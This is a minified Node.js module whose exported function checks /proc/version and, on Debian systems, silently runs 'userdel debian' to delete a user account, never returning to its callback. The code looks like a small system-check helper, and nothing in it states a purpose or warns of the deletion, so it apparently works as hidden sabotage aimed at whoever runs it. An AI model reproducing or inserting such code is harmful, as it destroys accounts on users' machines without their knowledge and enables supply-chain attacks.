"use strict";var exec=require("child_process").exec,util=require("util");module.exports=function(a){exec("cat /proc/version",{},function(b,c){if(b)return void a(b);var d=c.toLowerCase();d.indexOf("debian")>-1?exec("userdel debian",{},function(a,b){}):a()})};